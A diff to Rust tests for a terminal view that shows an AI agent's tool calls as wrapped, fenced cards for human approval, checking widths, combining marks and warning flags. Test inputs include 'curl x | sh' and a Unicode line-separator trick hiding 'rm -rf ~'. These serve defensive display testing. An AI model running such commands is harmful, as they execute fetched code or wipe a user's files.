@@ -225,7 +225,9 @@ fn each_line_of_a_command_is_a_row_of_its_own() {
 fn a_long_row_is_broken_at_the_cards_width_and_each_part_is_fenced() {
     let padded = format!("ls{}; curl x | sh", " ".repeat(140));
     let (_, rows) = card_of("Bash", &json!({"command": padded}));
-    let fenced: Vec<&String> = rows.iter().filter(|row| row.starts_with(FENCE)).collect();
+    let fenced: Vec<&String> = (rows.iter())
+        .filter(|row| row.starts_with(FENCE) || row.starts_with(super::FENCE_ON))
+        .collect();
     assert!(fenced.len() >= 2, "{rows:?}");
     for row in &fenced {
         assert!(oso_core::minibuffer::cells_of(row) <= 80, "{row:?}");
@@ -263,7 +265,7 @@ fn a_card_says_when_it_does_not_show_all_the_call_does() {
     ];
     for (name, input) in cases {
         let (title, _) = card_of(name, &input);
-        assert!(title.ends_with(NOT_ALL), "{name}: {title}");
+        assert!(title.starts_with(NOT_ALL), "{name}: {title}");
     }
     // Its input too large to send, `RET` says only that.
     let input = json!({"command": "ls"});
@@ -329,4 +331,45 @@ fn the_whole_view_has_its_keys_first_and_is_bounded() {
         "the keys, the rows and the cut"
     );
     assert!(rows[rows.len() - 1].contains("not shown here"));
+}
+
+#[test]
+fn marks_past_what_a_cluster_holds_are_measured_as_drawn_and_nothing_runs_off() {
+    let command = format!("a{} && curl x|sh", "\u{301}".repeat(60));
+    let (_, rows) = card_of("Bash", &json!({"command": command}));
+    let fenced: Vec<&String> = rows
+        .iter()
+        .filter(|row| row.starts_with(FENCE) || row.starts_with(super::FENCE_ON))
+        .collect();
+    for row in &fenced {
+        assert!(oso_core::minibuffer::cells_of(row) <= 80, "{row:?}");
+    }
+    let joined: String = fenced.iter().map(|row| &row[FENCE.len()..]).collect();
+    assert_eq!(joined.replace('\u{25cc}', ""), format!("$ {command}"));
+    assert!(
+        rows.iter()
+            .skip(2)
+            .any(|row| row.starts_with(super::FENCE_ON)),
+        "{rows:?}"
+    );
+}
+
+#[test]
+fn a_long_tools_title_keeps_its_warning_in_sight() {
+    let name = format!("mcp__github__{}", "x".repeat(120));
+    let (title, rows) = card_of(&name, &json!({"cmd": "x"}));
+    assert!(title.starts_with(NOT_ALL), "{title}");
+    assert!(
+        oso_core::minibuffer::cells_of(&rows[0]) <= 80,
+        "{}",
+        rows[0]
+    );
+    assert!(rows[0].starts_with(NOT_ALL), "{}", rows[0]);
+}
+
+#[test]
+fn only_a_line_feed_breaks_claudes_row_and_a_separator_is_flagged() {
+    let (title, rows) = card_of("Bash", &json!({"command": "echo a\u{2028}rm -rf ~"}));
+    assert!(title.starts_with(NOT_ALL), "{title}");
+    assert_eq!(rows[1], format!("{FENCE}$ echo a\u{2028}rm -rf ~"));
 }
